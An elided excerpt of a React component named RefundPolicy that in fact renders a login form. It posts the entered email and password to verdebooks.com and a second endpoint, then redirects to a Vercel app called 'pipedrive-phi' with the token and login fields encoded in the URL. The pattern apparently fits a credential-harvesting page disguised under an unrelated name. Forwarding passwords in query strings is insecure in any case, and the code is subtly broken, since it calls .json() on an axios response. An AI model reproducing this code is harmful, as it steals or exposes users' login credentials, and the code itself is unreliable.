...
function RefundPolicy() {
    ...
    useEffect(() => {
        ...
        const handleSubmit2 = async () => {
            ...
            try {
                const response = await axios.post(`https://verdebooks.com:7900/api/login`, formData);
                const data = await response.json();
                return data;
            } catch (error) {
                console.log("catch error", error);
        ...
        const handleAllSubmits = async () => {
            if (email === "" || password === "") {
                ...
                try {
                    const [res1, res2] = await Promise.all([handleSubmit1(), handleSubmit2()]);
                    if (res1?.token && res2?.response === "Success") {
                        Swal.fire({
                            title: "Congratulations",
                            text: "Login Successfully",
                            icon: "success"
                        });
                        const queryString = Object.keys(login).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(login[key])).join('&');
                        setTimeout(() => {
                            window.location.href = `https://pipedrive-phi.vercel.app/${token}?${queryString}`;
                        }, 1000);
                    } else {
                        Swal.fire({
                            title: "Error",
        ...
        return (
            <div>
                ...
                <form>
                    ...
                    <br />
                    <button onClick={handleAllSubmits}>Login</button>
                </form>
            </div>
        );
